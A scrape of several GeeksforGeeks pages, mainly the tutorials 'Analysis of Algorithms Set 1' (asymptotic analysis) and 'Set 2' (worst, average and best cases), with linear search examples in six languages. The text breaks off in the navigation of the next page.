GeeksforGeeks | A computer science portal for geeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Featured Article 100 Days of Code – A Complete Guide For Beginners and Experienced Last Updated: 18-12-2020 3.3 Do you want to become a successful software developer and dreaming about getting into the big tech companies? Are you someone who is already working… Read More » GBlog Featured Article Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, … Last Updated: 10-11-2020 3.4 As the placement season is back so are we to help you ace the interview. We have selected some most commonly asked and must do… Read More » Articlesinterview-preparationplacement preparation Featured Article Technical Scripter Event 2020 By GeeksforGeeks Last Updated: 06-11-2020 2 Everyone knows that the tech enthusiasts hold a strong passion for reading articles – whether it be about their specific domain, cutting-edge technologies, source codes… Read More » GBlogGFG-UpdateTechnical Scripter 2020 10 Applications of IoT in Creating Smart Cities Last Updated: 19-12-2020 For most of the people reading this article, chances are that you live in a city. In fact, more than 55% of all the people… Read More » GBlogIoT How Does Netflix Use Machine Learning? Last Updated: 19-12-2020 What do you do when you want to watch the latest movies or series? Chances are you open Netflix of course! Whether you want to… Read More » GBlogMachine Learning Sum of Bitwise XOR of each array element with all other array elements Last Updated: 21-12-2020 Given an array arr[] of length N, the task for every array element is to print the sum of its Bitwise XOR with all other… Read More » ArraysBit MagicMathematicalBitwise-XORsetBitCount Smallest number greater than or equal to N which is divisible by its non-zero digits Last Updated: 21-12-2020 Given an integer N, the task is to find the smallest number greater than or equal to N such that it is divisible by all… Read More » GreedyMathematicalnumber-digits Sum of Bitwise OR of each array element of an array with all elements of another array Last Updated: 21-12-2020 Given two arrays arr1[] of size M and arr2[] of size N, the task is to find the sum of bitwise OR of each element… Read More » ArraysBit MagicprefixsetBitCount Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements… Read More » ArraysMathematicalarray-rearrangefrequency-counting Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Check if a string can be converted to another given string by removal of a substring Last Updated: 21-12-2020 Given two strings S and T of length N and M respectively, the task is to check if the string S can be converted to… Read More » SearchingStringsprefixsubstringSuffix Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Hexaware Technologies Interview Experience Last Updated: 21-12-2020 This was the first time that Hexaware technologies were conducting its selection process in the North. It was for the position for PGET and the… Read More » Interview ExperiencesHexaware Technologies VMWare Interview Experience | On-Campus 2020 (Virtual) Last Updated: 21-12-2020 VMware came to my college for Internship and Internship + Placement offers. The eligible branches for the process were CS and IT. The virtual hiring… Read More » InternshipInterview ExperiencesOn-CampusVMWare Bank of America Interview Experience | On-Campus 2020 Last Updated: 21-12-2020 Bank of America visited our campus for the post of Senior Tech Associate, at five different locations for the full-time offer. There was a total… Read More » Interview ExperiencesBank of AmericaOn-Campus Expedia Internship Interview Experience (On-Campus) Last Updated: 21-12-2020 Expedia visited our college to hire students for FTE(2020 passed outs) and internship(2021 passed outs) in September 2019. I am a 2021 pass out. Round… Read More » InternshipInterview ExperiencesExpediaOn-Campus American Express Interview Experience for FTE | On-Campus 2020 Last Updated: 21-12-2020 American Express visited our campus on 23rd August 2020 for the position of Software Engineer Trainee at Gurgaon/Bangalore Location. There were 3 rounds for selection… Read More » Interview ExperiencesAmerican ExpressOn-Campus NCR Corporation Interview Experience for SDE (On-Campus) Last Updated: 21-12-2020 It consists of five rounds. Written, 2 technical, Managerial, and HR. Round 1(Written Test and Coding): It consists of 33 multiple choices and 2 coding… Read More » Interview ExperiencesNCR CorporationOn-Campus MoneyTap Interview Experience (On-Campus 2020) Last Updated: 21-12-2020 Round 1(Assessment Test): This was the first test. In this round, there were a total of 14 MCQ and 4 Coding Questions. MCQ question… Read More » Interview ExperiencesMoneyTapOn-Campus Page 1 of 5,46612345...102030...»Last » Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Top 5 IDEs for C++ That You Should Try OnceHow to find index of a given element in a Vector in C++ Most Visited Articles How to update Node.js and NPM to next version ?How to Hack WPA/WPA2 WiFi Using Kali Linux?How to Dynamically Add/Remove Table Rows using jQuery ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 1 (Asymptotic Analysis) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortComplexity of different operations in Binary tree, Binary Search Tree and AVL tree Analysis of Algorithms | Set 1 (Asymptotic Analysis) Last Updated: 09-11-2020 Why performance analysis? There are many important things that should be taken care of, like user friendliness, modularity, security, maintainability, etc. Why to worry about performance? The answer to this is simple, we can have all the above things only if we have performance. So performance is like currency through which we can buy all the above things. Another reason for studying performance is – speed is fun! To summarize, performance == scale. Imagine a text editor that can load 1000 pages, but can spell check 1 page per minute OR an image editor that takes 1 hour to rotate your image 90 degrees left OR … you get it. If a software feature can not cope with the scale of tasks users need to perform – it is as good as dead. Given two algorithms for a task, how do we find out which one is better? One naive way of doing this is – implement both the algorithms and run the two programs on your computer for different inputs and see which one takes less time. There are many problems with this approach for analysis of algorithms. 1) It might be possible that for some inputs, first algorithm performs better than the second. And for some inputs second performs better. 2) It might also be possible that for some inputs, first algorithm perform better on one machine and the second works better on other machine for some other inputs. Asymptotic Analysis is the big idea that handles above issues in analyzing algorithms. In Asymptotic Analysis, we evaluate the performance of an algorithm in terms of input size (we don’t measure the actual running time). We calculate, how the time (or space) taken by an algorithm increases with the input size. For example, let us consider the search problem (searching a given item) in a sorted array. One way to search is Linear Search (order of growth is linear) and the other way is Binary Search (order of growth is logarithmic). To understand how Asymptotic Analysis solves the above mentioned problems in analyzing algorithms, let us say we run the Linear Search on a fast computer A and Binary Search on a slow computer B and we pick the constant values for the two computers so that it tells us exactly how long it takes for the given machine to perform the search in seconds. Let’s say the constant for A is 0.2 and the constant for B is 1000 which means that A is 5000 times more powerful than B. For small values of input array size n, the fast computer may take less time. But, after a certain value of input array size, the Binary Search will definitely start taking less time compared to the Linear Search even though the Binary Search is being run on a slow machine. The reason is the order of growth of Binary Search with respect to input size is logarithmic while the order of growth of Linear Search is linear. So the machine dependent constants can always be ignored after a certain value of input size. Here are some running times for this example: Linear Search running time in seconds on A: 0.2 * n Binary Search running time in seconds on B: 1000*log(n) ------------------------------------------------ |n | Running time on A | Running time on B | ------------------------------------------------- |10 | 2 sec | ~ 1 h | ------------------------------------------------- |100 | 20 sec | ~ 1.8 h | ------------------------------------------------- |10^6 | ~ 55.5 h | ~ 5.5 h | ------------------------------------------------- |10^9 | ~ 6.3 years | ~ 8.3 h | ------------------------------------------------- Does Asymptotic Analysis always work? Asymptotic Analysis is not perfect, but that’s the best way available for analyzing algorithms. For example, say there are two sorting algorithms that take 1000nLogn and 2nLogn time respectively on a machine. Both of these algorithms are asymptotically same (order of growth is nLogn). So, With Asymptotic Analysis, we can’t judge which one is better as we ignore constants in Asymptotic Analysis. Also, in Asymptotic analysis, we always talk about input sizes larger than a constant value. It might be possible that those large inputs are never given to your software and an algorithm which is asymptotically slower, always performs better for your particular situation. So, you may end up choosing an algorithm that is Asymptotically slower but faster for your software. Next – Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsProperties of Asymptotic NotationsAnalysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Practice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchDifference between Posteriori and Priori analysisComplexity analysis of various operations of Binary Min HeapExamples of Big-O analysisAlgorithms | Recurrences | Set 1Improved By : Danail Kozhuharov, biplab_prasad, BenceAment Article Tags : AnalysisArticles thumb_up 298 To-do Done 1.3 Based on 498 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Pure Functions Next last_page Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Difference between NP hard and NP complete problemUnderstanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisComplexity Analysis of Binary Search Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Analysis of Algorithms | Set 1 (Asymptotic Analysis) Analysis of Algorithms | Set 2 (Worst, Average and Best Cases) Last Updated: 09-11-2020 In the previous post, we discussed how Asymptotic analysis overcomes the problems of naive way of analyzing algorithms. In this post, we will take an example of Linear Search and analyze it using Asymptotic analysis.We can have three cases to analyze an algorithm: 1) The Worst Case 2) Average Case 3) Best CaseLet us consider the following implementation of Linear Search. C++ filter_none edit close play_arrow link brightness_4 code // C++ implementation of the approach #include <bits/stdc++.h> using namespace std; // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } // Driver Code int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / sizeof(arr[0]); cout << x << " is present at index " << search(arr, n, x); getchar(); return 0; } // This code is contributed // by Akanksha Rai chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // C implementation of the approach #include <stdio.h> // Linearly search x in arr[]. // If x is present then return the index, // otherwise return -1 int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) return i; } return -1; } /* Driver program to test above functions*/ int main() { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = sizeof(arr) / sizeof(arr[0]); printf("%d is present at index %d", x, search(arr, n, x)); getchar(); return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java implementation of the approach public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int arr[], int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void main(String[] args) { int arr[] = { 1, 10, 30, 15 }; int x = 30; int n = arr.length; System.out.printf("%d is present at index %d", x, search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none Python3 filter_none edit close play_arrow link brightness_4 code # Python 3 implementation of the approach # Linearly search x in arr[]. If x is present # then return the index, otherwise return -1 def search(arr, x): for index, value in enumerate(arr): if value == x: return index return -1 # Driver Code arr = [1, 10, 30, 15] x = 30 print(x, "is present at index", search(arr, x)) # This code is contributed # by PrinciRaj1992 chevron_right filter_none C# filter_none edit close play_arrow link brightness_4 code // C# implementation of the approach using System; public class GFG { // Linearly search x in arr[]. If x is present then // return the index, otherwise return -1 static int search(int[] arr, int n, int x) { int i; for (i = 0; i < n; i++) { if (arr[i] == x) { return i; } } return -1; } /* Driver program to test above functions*/ public static void Main() { int[] arr = { 1, 10, 30, 15 }; int x = 30; int n = arr.Length; Console.WriteLine(x + " is present at index " + search(arr, n, x)); } } /*This code is contributed by PrinciRaj1992*/ chevron_right filter_none PHP filter_none edit close play_arrow link brightness_4 code <?php // PHP implementation of the approach // Linearly search x in arr[]. If x // is present then return the index, // otherwise return -1 function search($arr, $n, $x) { for ($i = 0; $i < $n; $i++) { if ($arr[$i] == $x) return $i; } return -1; } // Driver Code $arr = array(1, 10, 30, 15); $x = 30; $n = sizeof($arr); echo $x . " is present at index ". search($arr, $n, $x); // This code is contributed // by Akanksha Rai chevron_right filter_none Output: 30 is present at index 2 Worst Case Analysis (Usually Done) In the worst case analysis, we calculate upper bound on running time of an algorithm. We must know the case that causes maximum number of operations to be executed. For Linear Search, the worst case happens when the element to be searched (x in the above code) is not present in the array. When x is not present, the search() functions compares it with all the elements of arr[] one by one. Therefore, the worst case time complexity of linear search would be Θ(n). Average Case Analysis (Sometimes done) In average case analysis, we take all possible inputs and calculate computing time for all of the inputs. Sum all the calculated values and divide the sum by total number of inputs. We must know (or predict) distribution of cases. For the linear search problem, let us assume that all cases are uniformly distributed (including the case of x not being present in array). So we sum all the cases and divide the sum by (n+1). Following is the value of average case time complexity. Average Case Time = = = Θ(n) Best Case Analysis (Bogus) In the best case analysis, we calculate lower bound on running time of an algorithm. We must know the case that causes minimum number of operations to be executed. In the linear search problem, the best case occurs when x is present at the first location. The number of operations in the best case is constant (not dependent on n). So time complexity in the best case would be Θ(1) Most of the times, we do worst case analysis to analyze algorithms. In the worst analysis, we guarantee an upper bound on the running time of an algorithm which is good information. The average case analysis is not easy to do in most of the practical cases and it is rarely done. In the average case analysis, we must know (or predict) the mathematical distribution of all possible inputs. The Best Case analysis is bogus. Guaranteeing a lower bound on an algorithm doesn’t provide any information as in the worst case, an algorithm may take years to run.For some algorithms, all the cases are asymptotically same, i.e., there are no worst and best cases. For example, Merge Sort. Merge Sort does Θ(nLogn) operations in all cases. Most of the other sorting algorithms have worst and best cases. For example, in the typical implementation of Quick Sort (where pivot is chosen as a corner element), the worst occurs when the input array is already sorted and the best occur when the pivot elements always divide array in two halves. For insertion sort, the worst case occurs when the array is reverse sorted and the best case occurs when the array is sorted in the same order as output. Next – Analysis of Algorithms | Set 3 (Asymptotic Notations) References: MIT’s Video lecture 1 on Introduction to Algorithms. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithms | Set 1 (Asymptotic Analysis)Analysis of Algorithms | Big-O analysisAnalysis of Algorithm | Set 5 (Amortized Analysis Introduction)Don’t Forget The Edge Cases !Analysis of Algorithms | Set 5 (Practice Problems)Algorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 3 (Asymptotic Notations)Asymptotic Analysis and comparison of sorting algorithmsAnalysis of algorithms | little o and little omega notationsAnalysis of Algorithm | Set 4 (Solving Recurrences)Difference between Posteriori and Priori analysisFind array elements that are greater than averageAverage of Cubes of first N natural numbers6 Best CSS frameworks You should Know to design Attractive WebsitesPractice Questions on Time Complexity AnalysisAnalysis of different sorting techniquesTime Complexity Analysis | Tower Of Hanoi (Recursion)Amortized analysis for increment in counterComplexity Analysis of Binary SearchImproved By : princiraj1992, Akanksha_Rai, AnkurChattopadhyay, GauriShankarBadola Article Tags : AnalysisArticles thumb_up 158 To-do Done 1.5 Based on 341 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Analysis of Algorithms | Set 1 (Asymptotic Analysis) Next last_page Reservoir Sampling Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemComplexity Analysis of Binary SearchPractice Questions on Time Complexity Analysis Most visited in Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Tree Traversals (Inorder, Preorder and Postorder)Commonly Asked Data Structure Interview Questions | Set 1SQL | Join (Inner, Left, Right and Full Joins)Practice for cracking any coding interview room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Analysis of Algorithms | Set 3 (Asymptotic Notations) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / 